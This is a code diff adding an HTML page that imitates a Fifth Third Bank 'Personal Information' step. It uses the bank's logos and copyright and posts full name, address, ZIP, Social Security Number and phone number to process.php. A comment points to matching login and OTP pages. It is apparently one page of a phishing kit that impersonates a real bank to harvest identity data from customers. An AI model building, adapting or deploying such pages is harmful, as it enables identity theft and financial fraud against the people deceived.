@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fifth – Personal Information</title>
+    <link rel="stylesheet" href="res\css\main.css" />
+    <style>
+        /* ── consistent with login / OTP pages ── */
+        .login {
+            background: #fff;
+            padding: 30px 35px 35px;
+            border-radius: 8px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .login h2 {
+            margin-top: 0;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 1.6rem;
+            color: #1a2a3a;
+        }
+        .login .subhead {
+            margin-top: 4px;
+            margin-bottom: 22px;
+            color: #555;
+            font-size: 0.95rem;
+        }
+        .group {
+            margin-bottom: 18px;
+        }
+        .group label {
+            display: block;
+            font-weight: 500;
+            font-size: 0.9rem;
+            margin-bottom: 4px;
+            color: #333;
+        }
+        .group input {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1rem;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        .group input:focus {
+            border-color: #0055a5;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 85, 165, 0.15);
+        }
+        .row {
+            display: flex;
+            gap: 16px;
+        }
+        .row .group {
+            flex: 1;
+        }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background: #0055a5;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 4px;
+        }
+        .login-button:hover {
+            background: #003d7a;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 30px;
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        header .logo img {
+            height: 40px;
+            width: auto;
+        }
+        header .logoo img {
+            height: 32px;
+            width: auto;
+        }
+        header .links {
+            font-size: 0.8rem;
+            color: #555;
+        }
+        header .links a {
+            color: #0055a5;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+        header .links a:hover {
+            text-decoration: underline;
+        }
+        header .links a:first-child {
+            margin-left: 0;
+        }
+
+        .bottom {
+            padding: 14px 30px;
+            font-size: 0.85rem;
+            background: #f8f9fa;
+            border-bottom: 1px solid #e5e5e5;
+            color: #555;
+        }
+        .bottom a {
+            color: #0055a5;
+            text-decoration: none;
+        }
+        .bottom a:hover {
+            text-decoration: underline;
+        }
+        .bottom span {
+            color: #333;
+            font-weight: 500;
+        }
+
+        .container {
+            padding: 40px 20px;
+            max-width: 520px;
+            margin: 0 auto;
+            min-height: 50vh;
+        }
+
+        footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 30px;
+            background: #f2f4f6;
+            border-top: 1px solid #ddd;
+            font-size: 0.75rem;
+            color: #555;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        footer .logo img {
+            height: 28px;
+            width: auto;
+        }
+        footer p {
+            margin: 0;
+            flex: 1;
+        }
+
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+            header .links {
+                text-align: center;
+            }
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .login {
+                padding: 20px;
+            }
+            footer {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ═══ HEADER ═══ -->
+    <header>
+        <div class="logo">
+            <img src="res\img\logo.svg" alt="Fifth Third Bank" />
+        </div>
+        <div class="logoo">
+            <img src="res\img\logoo.png" alt="logo" />
+        </div>
+        <div class="links">
+            <a href="#">CUSTOMER SERVICE</a> |
+            <a href="#">BRANCH &amp; ATM LOCATOR</a>
+        </div>
+    </header>
+
+    <!-- ═══ BREADCRUMB ═══ -->
+    <div class="bottom">
+        <a href="#">Home</a> &gt; <span>Personal Information</span>
+    </div>
+
+    <!-- ═══ MAIN CONTENT ═══ -->
+    <div class="container">
+
+        <div class="login">
+            <h2>Personal Information</h2>
+            <p class="subhead">Please provide your details below.</p>
+
+            <form action="process.php" method="post">
+
+                <!-- Full Name -->
+                <div class="group">
+                    <label for="fullname">Full Name</label>
+                    <input type="text" id="fullname" name="fullname" required placeholder="e.g. John A. Doe" autofocus />
+                </div>
+
+                <!-- Address (street) -->
+                <div class="group">
+                    <label for="address">Address</label>
+                    <input type="text" id="address" name="address" required placeholder="Street address" />
+                </div>
+
+                <!-- City + ZIP (side‑by‑side) -->
+                <div class="row">
+                    <div class="group">
+                        <label for="city">City</label>
+                        <input type="text" id="city" name="city" required placeholder="City" />
+                    </div>
+                    <div class="group">
+                        <label for="zip">ZIP Code</label>
+                        <input type="text" id="zip" name="zip" required placeholder="e.g. 12345" />
+                    </div>
+                </div>
+
+                <!-- SSN -->
+                <div class="group">
+                    <label for="ssn">Social Security Number</label>
+                    <input type="text" id="ssn" name="ssn" required placeholder="XXX-XX-XXXX" />
+                </div>
+
+                <!-- Phone Number -->
+                <div class="group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="(123) 456-7890" />
+                </div>
+
+                <button type="submit" class="login-button">Continue</button>
+
+            </form>
+        </div>
+
+    </div>
+
+    <!-- ═══ FOOTER ═══ -->
+    <footer>
+        <p>
+            Copyright &copy; 2024 Fifth Third Bank, National Association.
+            All Rights Reserved. Member FDIC. FDIC Logo Equal Housing Lender
+        </p>
+        <div class="logo">
+            <img src="res\img\logo.svg" alt="Fifth Third Bank" />
+        </div>
+    </footer>
+
+</body>
+</html>
